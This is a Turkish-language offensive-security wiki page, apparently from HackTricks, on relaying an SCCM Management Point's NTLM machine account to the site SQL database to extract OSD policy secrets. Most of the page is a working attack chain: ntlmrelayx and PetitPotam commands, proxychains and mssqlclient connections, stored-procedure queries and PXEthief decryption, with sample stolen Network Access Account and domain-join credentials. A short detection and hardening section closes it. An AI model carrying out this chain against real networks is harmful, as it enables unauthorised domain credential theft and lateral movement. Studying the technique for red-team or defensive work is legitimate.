# SCCM Yönetim Noktası NTLM Relay ile SQL – OSD Politika Gizli Çıkarma

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Bir **System Center Configuration Manager (SCCM) Yönetim Noktası (MP)**'nı SMB/RPC üzerinden kimlik doğrulamaya zorlayarak ve bu NTLM makine hesabını **site veritabanına (MSSQL)** **aktarıp** `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz. Bu roller, **İşletim Sistemi Dağıtımı (OSD)** politika blob'larını (Ağ Erişim Hesabı kimlik bilgileri, Görev Dizisi değişkenleri vb.) açığa çıkaran bir dizi saklı prosedürü çağırmanıza olanak tanır. Blob'lar hex kodlu/şifreli olup, **PXEthief** ile çözülebilir ve şifresi çözülebilir, düz metin gizli bilgileri verir.

Yüksek seviyeli zincir:
1. MP & site DB'yi keşfet ↦ kimlik doğrulaması yapılmamış HTTP uç noktası `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` başlat.
3. MP'yi **PetitPotam**, PrinterBug, DFSCoerce vb. kullanarak zorla.
4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile aktarılan **<DOMAIN>\\<MP-host>$** hesabı olarak bağlan.
5. Aşağıdakileri çalıştır:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM'u çıkar, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` gibi gizli bilgiler, PXE veya istemcilerle etkileşime girmeden kurtarılır.

---

## 1. Kimlik doğrulaması yapılmamış MP uç noktalarını listeleme
MP ISAPI uzantısı **GetAuth.dll**, kimlik doğrulaması gerektirmeyen birkaç parametre sunar (site yalnızca PKI ise):

| Parametre | Amaç |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Site imzalama sertifikası genel anahtarını + *x86* / *x64* **Tüm Bilinmeyen Bilgisayarlar** cihazlarının GUID'lerini döndürür. |
| `MPLIST` | Sitedeki her Yönetim Noktasını listeler. |
| `SITESIGNCERT` | Birincil Site imzalama sertifikasını döndürür (site sunucusunu LDAP olmadan tanımlar). |

Daha sonraki DB sorguları için **clientID** olarak kullanılacak GUID'leri alın:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP makine hesabını MSSQL'e iletme
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Zorlamanın tetiklendiğinde şöyle bir şey görmelisiniz:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. OSD politikalarını saklanan prosedürler aracılığıyla tanımlayın
SOCKS proxy üzerinden bağlanın (varsayılan olarak port 1080):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB'sine geçin (3 haneli site kodunu kullanın, örneğin `CM_001`).

### 3.1 Bilinmeyen Bilgisayar GUID'lerini Bulun (isteğe bağlı)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 Atanan politikaları listele
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Her satır `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion` içerir.

Politikalara odaklanın:
* **NAAConfig**  – Ağ Erişim Hesabı kimlik bilgileri
* **TS_Sequence** – Görev Sırası değişkenleri (OSDJoinAccount/Password)
* **CollectionSettings** – Çalıştırma hesabı içerebilir

### 3.3  Tam gövdeyi al
Eğer zaten `PolicyID` ve `PolicyVersion`'a sahipseniz, clientID gereksinimini atlayabilirsiniz:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ÖNEMLİ: SSMS'de "Maksimum Alınan Karakterler" değerini artırın (>65535) aksi takdirde blob kesilecektir.

---

## 4. Blob'u çöz ve şifreyi çöz
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Kurtarılan gizli bilgiler örneği:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. İlgili SQL rolleri ve prosedürleri
Relay sırasında oturum açma şu şekilde eşlenir:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Bu roller, bu saldırıda kullanılan ana EXEC izinleri de dahil olmak üzere, onlarca EXEC izni sunar:

| Saklanan Prosedür | Amaç |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Bir `clientID` için uygulanan politikaları listele. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Tam politika gövdesini döndür. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` yolu tarafından döndürülür. |

Tam listeyi inceleyebilirsiniz:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Tespit ve Güçlendirme
1. **MP oturumlarını izleyin** – herhangi bir MP bilgisayar hesabının, ana bilgisayarı olmayan bir IP'den oturum açması ≈ relay.
2. Site veritabanında **Kimlik Doğrulama için Genişletilmiş Koruma (EPA)**'yı etkinleştirin (`PREVENT-14`).
3. Kullanılmayan NTLM'yi devre dışı bırakın, SMB imzasını zorlayın, RPC'yi kısıtlayın (aynı önlemler `PetitPotam`/`PrinterBug` için kullanılır).
4. MP ↔ DB iletişimini IPSec / karşılıklı-TLS ile güçlendirin.

---

## Ayrıca bakınız
* NTLM relay temelleri:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL kötüye kullanımı ve sonrası:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Referanslar
- [Yöneticiyle Konuşmak İsterim: Yönetim Noktası Relay'leri ile Sırları Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Yanlış Yapılandırma Yöneticisi – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
